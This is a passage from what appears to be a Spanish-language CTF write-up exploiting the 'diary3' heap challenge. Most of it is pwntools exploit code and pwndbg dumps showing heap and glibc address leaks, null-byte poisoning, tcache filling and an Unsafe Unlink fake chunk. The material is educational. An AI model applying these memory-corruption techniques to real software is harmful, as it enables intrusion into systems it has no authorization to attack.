<span class="mtk1">    </span><span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk4">'continue'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">_</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">9</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">88</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">9</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">8</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">88</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'X'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">heap_base_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (u64(</span><span class="mtk8">recount</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)[:</span><span class="mtk6">8</span><span class="mtk1">].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) </span><span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">fffffffffffff000</span><span class="mtk1">) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1000</span>  
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Heap base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">heap_base_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">_</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">88</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'Y'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk8">recount</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">7</span><span class="mtk1">)[:</span><span class="mtk6">8</span><span class="mtk1">].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1e4d59</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span>()
</code></pre></div><p>Dado que tenemos GDB conectado al proceso, podemos verificar que nuestra dirección base sea correcta:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './diary3'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'./'</span>
[<span class="code-green">+</span>] Starting local process './diary3': pid 3602279
[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './diary3', '3602279', '-x', '/tmp/pwn0e8inigl.gdb']  
[<span class="code-green">+</span>] Waiting for debugger: Done
[<span class="code-blue">*</span>] Heap base address: 0x55b818fab000
[<span class="code-green">+</span>] Glibc base address: 0x7f191c93a000
[<span class="code-blue">*</span>] Switching to interactive mode

1. edit dream
2. delete dream
3. recount dream
4. exit diary
&gt; <span class="code-red">$</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>vmmap
LEGEND: <span class="code-dark-yellow">STACK</span> | <span class="code-dark-blue">HEAP</span> | <span class="code-dark-red">CODE</span> | <span class="code-dark-magenta">DATA</span> | <span class="mtku">RWX</span> | RODATA
             Start                End Perm     Size Offset File
    0x55b8183c9000     0x55b8183ca000 r--p     1000      0 ./diary3
<span class="code-dark-red">    0x55b8183ca000     0x55b8183cb000 r-xp     1000   1000 ./diary3</span>
    0x55b8183cb000     0x55b8183cc000 r--p     1000   2000 ./diary3
    0x55b8183cc000     0x55b8183cd000 r--p     1000   2000 ./diary3
<span class="code-dark-magenta">    0x55b8183cd000     0x55b8183d0000 rw-p     3000   3000 ./diary3</span>
<span class="code-dark-blue">    0x55b818fab000     0x55b818fcc000 rw-p    21000      0 [heap]</span>
    0x7f191c93a000     0x7f191c95f000 r--p    25000      0 ./libc.so.6
<span class="code-dark-red">    0x7f191c95f000     0x7f191cad2000 r-xp   173000  25000 ./libc.so.6</span>
    0x7f191cad2000     0x7f191cb1b000 r--p    49000 198000 ./libc.so.6
    0x7f191cb1b000     0x7f191cb1e000 r--p     3000 1e0000 ./libc.so.6
<span class="code-dark-magenta">    0x7f191cb1e000     0x7f191cb21000 rw-p     3000 1e3000 ./libc.so.6</span>
<span class="code-dark-magenta">    0x7f191cb21000     0x7f191cb27000 rw-p     6000      0 [anon_7f191cb21]</span>  
    0x7f191cb27000     0x7f191cb28000 r--p     1000      0 ./ld-2.29.so
<span class="code-dark-red">    0x7f191cb28000     0x7f191cb49000 r-xp    21000   1000 ./ld-2.29.so</span>
    0x7f191cb49000     0x7f191cb51000 r--p     8000  22000 ./ld-2.29.so
    0x7f191cb51000     0x7f191cb52000 r--p     1000  29000 ./ld-2.29.so
<span class="code-dark-magenta">    0x7f191cb52000     0x7f191cb53000 rw-p     1000  2a000 ./ld-2.29.so</span>
<span class="code-dark-magenta">    0x7f191cb53000     0x7f191cb54000 rw-p     1000      0 [anon_7f191cb53]</span>
<span class="code-dark-yellow">    0x7ffc73842000     0x7ffc73863000 rw-p    21000      0 [stack]</span>
    0x7ffc73939000     0x7ffc7393c000 r--p     3000      0 [vvar]
<span class="code-dark-red">    0x7ffc7393c000     0x7ffc7393d000 r-xp     1000      0 [vdso]</span>
<span class="code-dark-red">0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]</span>
</code></pre></div><p>Todo es perfecto.</p><h3 id="_null-byte-poisoning_"><em>Null byte poisoning</em></h3><p>Para que este ataque funcione, necesitamos usar al menos <em>chunks</em> de tamaño <code>0x100</code>, porque sobrescribiremos el último byte con un byte nulo y queremos mantener un tamaño válido. Entonces, asignaremos dos <em>chunks</em> y editaremos el superior para alterar el tamaño del segundo <em>chunk</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'asdf'</span><span class="mtk1">)</span>  <span class="mtk3"># 9</span>
<span class="mtk1">    </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'qwer'</span><span class="mtk1">)</span>  <span class="mtk3"># 10</span>  
<span class="mtk1">    </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">9</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">)</span>
</code></pre></div><p>Así está el <em>heap</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>heap
<span class="code-dark-yellow">Allocated chunk</span> | <span class="code-dark-yellow">PREV_INUSE</span>
Addr: <span class="code-dark-blue">0x557ddf5ac000</span>
Size: 0x251

<span class="code-dark-green">Free chunk (tcachebins)</span> | <span class="code-dark-yellow">PREV_INUSE</span>
Addr: <span class="code-dark-blue">0x557ddf5ac250</span>
Size: 0x411
<span class="code-red">fd</span>: 0x00

<span class="code-dark-yellow">Allocated chunk</span> | <span class="code-dark-yellow">PREV_INUSE</span>
Addr: <span class="code-dark-blue">0x557ddf5ac660</span>
Size: 0x1011

<span class="code-dark-yellow">Allocated chunk</span> | <span class="code-dark-yellow">PREV_INUSE</span>
Addr: <span class="code-dark-blue">0x557ddf5ad670</span>
Size: 0x91

...

<span class="code-dark-yellow">Allocated chunk</span> | <span class="code-dark-yellow">PREV_INUSE</span>
Addr: <span class="code-dark-blue">0x557ddf5adaf0</span>
Size: 0x91

<span class="code-dark-yellow">Allocated chunk</span> | <span class="code-dark-yellow">PREV_INUSE</span>
Addr: <span class="code-dark-blue">0x557ddf5adb80</span>
Size: 0x101

<span class="code-dark-yellow">Allocated chunk</span>
Addr: <span class="code-dark-blue">0x557ddf5adc80</span>
Size: 0x100

<span class="code-dark-red">Top chunk</span> | <span class="code-dark-yellow">PREV_INUSE</span>
Addr: <span class="code-dark-blue">0x557ddf5add80</span>
Size: 0x1f281

<span class="code-red">pwndbg&gt; </span>x/50gx 0x557ddf5adb80
<span class="code-dark-blue">0x557ddf5adb80</span>: 0x0000000000000000      0x0000000000000101  
<span class="code-dark-blue">0x557ddf5adb90</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x557ddf5adba0</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x557ddf5adbb0</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x557ddf5adbc0</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x557ddf5adbd0</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x557ddf5adbe0</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x557ddf5adbf0</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x557ddf5adc00</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x557ddf5adc10</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x557ddf5adc20</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x557ddf5adc30</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x557ddf5adc40</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x557ddf5adc50</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x557ddf5adc60</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x557ddf5adc70</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x557ddf5adc80</span>: 0x4141414141414141      0x0000000000000100
<span class="code-dark-blue">0x557ddf5adc90</span>: 0x0000000072657771      0x0000000000000000
<span class="code-dark-blue">0x557ddf5adca0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x557ddf5adcb0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x557ddf5adcc0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x557ddf5adcd0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x557ddf5adce0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x557ddf5adcf0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x557ddf5add00</span>: 0x0000000000000000      0x0000000000000000
</code></pre></div><p>Como se puede ver, el segundo fragmento tiene la <em>flag</em> <code>PREV_INUSE</code> a <code>0</code>. Una vez que liberemos el <em>chunk</em> superior, si liberamos el <em>chunk</em> inferior, el asignador del <em>heap</em> intentará consolidar el <em>heap</em> y fusionar los dos <em>chunks</em>. Este es el punto donde el <em>exploit</em> de <em>Unsafe Unlink</em> será útil.</p><p>Sin embargo, dado que este Glibc usa Tcache, primero necesitamos llenar el Tcache, de modo que el asignador del <em>heap</em> meta los dos <em>chunks</em> anteriores en el <em>Unsorted Bin</em> y no en el Tcache:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">_</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">7</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'Z'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">7</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">11</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">6</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">)</span>  
</code></pre></div><p>Debemos agregar un <em>chunk</em> falso para realizar el <em>Unsafe Unlink</em>. Leí sobre esta técnica en estos recursos:</p><ul><li><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/unsafe_unlink.c">how2heap</a></li><li><a href="https://guyinatuxedo.github.io/30-unlink/unlink_explanation/index.html">Nightmare</a></li><li><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">heap-exploitation</a></li><li><a href="https://infosecwriteups.com/the-toddlers-introduction-to-heap-exploitation-unsafe-unlink-part-4-3-75e00e1b0c68">infosecwriteups</a></li></ul><p>Con los recursos anteriores, debería estar claro lo que queremos lograr. Estamos tratando de confundir al asignador del <em>heap</em> para que consolide el segundo <em>chunk</em> con un <em>chunk</em> falso que hemos puesto en la sección de datos del <em>chunk</em> superior. Como resultado, obtendremos <em>chunks</em> solapados (<em>overlapping chunks</em>).</p><p>Para que funcione el <em>Unsafe Unlink</em>, necesitamos satisfacer algunas comprobaciones de seguridad que se explican en los enlaces anteriores. Después de mucha depuración, llegamos a este código para insertar el <em>chunk</em> falso y realizamos con éxito el <em>exploit</em> de <em>Unsafe Unlink</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">holder_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">heap_base_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">2490</span>
<span class="mtk1">    </span><span class="mtk1">victim_chunk_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">heap_base_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1b90</span>
<span class="mtk1">    </span><span class="mtk1">fake_fd</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">holder_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span>
<span class="mtk1">    </span><span class="mtk1">fake_bk</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">holder_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">10</span>

<span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">9</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">f0</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">fake_fd</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">fake_bk</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">d0</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">f0</span><span class="mtk1">))</span>  

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">_</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">7</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'Z'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">7</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">11</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">6</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span><span class="mtk1">, p64(</span><span class="mtk1">victim_chunk_addr</span><span class="mtk1">))</span>  <span class="mtk3"># 11</span>
</code></pre></div><p>Nótese que ingresé un <em>chunk</em> de tamaño <code>0x20</code> para contener la dirección del <em>chunk</em> víctima y así evitar los controles de seguridad. Además, dado que <code>edit_dream</code> no nos permite introducir bytes nulos, podemos liberar el <em>chunk</em> y asignarlo nuevamente porque <code>write_dreams</code> sí permite bytes nulos. Observe también que el proceso de llenar el Tcache aparece en medio de la configuración para el <em>Unsafe Unlink</em>.</p><p>Ahora, cuando ejecutemos <code>delete(p, 10)</code> desencadenaremos <code>malloc_consolidate</code>. Este es el diseño del <em>heap</em> antes de esto:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/50gx 0x563b8f3eab80
<span class="code-dark-blue">0x563b8f3eab80</span>: 0x0000000000000000      0x0000000000000101  
<span class="code-dark-blue">0x563b8f3eab90</span>: 0x0000000000000000      0x00000000000000f0
<span class="code-dark-blue">0x563b8f3eaba0</span>: 0x0000563b8f3eb478      0x0000563b8f3eb480
<span class="code-dark-blue">0x563b8f3eabb0</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eabc0</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eabd0</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eabe0</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eabf0</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac00</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac10</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac20</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac30</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac40</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac50</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac60</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac70</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac80</span>: 0x00000000000000f0      0x0000000000000100
<span class="code-dark-blue">0x563b8f3eac90</span>: 0x0000000072657771      0x0000000000000000
<span class="code-dark-blue">0x563b8f3eaca0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x563b8f3eacb0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x563b8f3eacc0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x563b8f3eacd0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x563b8f3eace0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x563b8f3eacf0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x563b8f3ead00</span>: 0x0000000000000000      0x0000000000000000
<span class="code-red">pwndbg&gt; </span>x/4gx 0x0000563b8f3eb478
<span class="code-dark-blue">0x563b8f3eb478</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x563b8f3eb488</span>: 0x0000000000000021      0x0000563b8f3eab90
<span class="code-red">pwndbg&gt; </span>x/gx 0x0000563b8f3eb478 + 0x18
<span class="code-dark-blue">0x563b8f3eb490</span>: 0x0000563b8f3eab90
<span class="code-red">pwndbg&gt; </span>x/gx 0x0000563b8f3eb480 + 0x10
<span class="code-dark-blue">0x563b8f3eb490</span>: 0x0000563b8f3eab90
<span class="code-red">pwndbg&gt; </span>continue
Continuing.
</code></pre></div><p>Obsérvese que todo está preparado para que funcione el <em>exploit</em> de <em>Unsafe Unlink</em> (tamaño falso, tamaño anterior y configuración correcta de los punteros <code>fd</code> y <code>bk</code>).</p><p>Ahora eliminamos el <em>chunk</em> en el índice <code>10</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './diary3'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'./'</span>
[<span class="code-green">+</span>] Starting local process './diary3': pid 3625301
[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './diary3', '3625301', '-x', '/tmp/pwng9cpqogc.gdb']  
[<span class="code-green">+</span>] Waiting for debugger: Done
[<span class="code-blue">*</span>] Heap base address: 0x563b8f3e9000
[<span class="code-green">+</span>] Glibc base address: 0x7fa22c102000
[<span class="code-blue">*</span>] Switching to interactive mode
done
1. write about dream
2. edit dream
3. delete dream
4. recount dream
5. exit diary
&gt; <span class="code-red">$</span> 3
index: <span class="code-red">$</span> 10
diary page deleted
1. write about dream
2. edit dream
3. delete dream
4. recount dream
5. exit diary
&gt; <span class="code-red">$</span>
</code></pre></div><p>Ahora el <em>heap</em> ha cambiado un poco:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/50gx 0x563b8f3eab80
<span class="code-dark-blue">0x563b8f3eab80</span>: 0x0000000000000000      0x0000000000000101
<span class="code-dark-blue">0x563b8f3eab90</span>: 0x0000000000000000      0x00000000000001f1
<span class="code-dark-blue">0x563b8f3eaba0</span>: 0x00007fa22c2e6ca0      0x00007fa22c2e6ca0
<span class="code-dark-blue">0x563b8f3eabb0</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eabc0</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eabd0</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eabe0</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eabf0</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac00</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac10</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac20</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac30</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac40</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac50</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac60</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac70</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x563b8f3eac80</span>: 0x00000000000000f0      0x0000000000000100
<span class="code-dark-blue">0x563b8f3eac90</span>: 0x0000000072657771      0x0000000000000000
<span class="code-dark-blue">0x563b8f3eaca0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x563b8f3eacb0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x563b8f3eacc0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x563b8f3eacd0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x563b8f3eace0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x563b8f3eacf0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x563b8f3ead00</span>: 0x0000000000000000      0x0000000000000000
<span class="code-red">pwndbg&gt; </span>bins
<span class="code-dark-blue">tcachebins</span>
<span class="code-dark-yellow">0x100 [  7]</span>: <span class="code-dark-blue">0x563b8f3ead90</span> —▸ <span class="code-dark-blue">0x563b8f3eae90</span> —▸ <span class="code-dark-blue">0x563b8f3eaf90</span> —▸ <span class="code-dark-blue">0x563b8f3eb090</span> —▸ <span class="code-dark-blue">0x563b8f3eb190</span> —▸ <span class="code-dark-blue">0x563b8f3eb290</span> —▸ <span class="code-dark-blue">0x563b8f3eb390</span> ◂— 0x0  
<span class="code-dark-yellow">0x410 [  1]</span>: <span class="code-dark-blue">0x563b8f3e9260</span> ◂— 0x0
<span class="code-dark-blue">fastbins</span>
<span class="code-dark-yellow">empty</span>
<span class="code-dark-blue">unsortedbin</span>
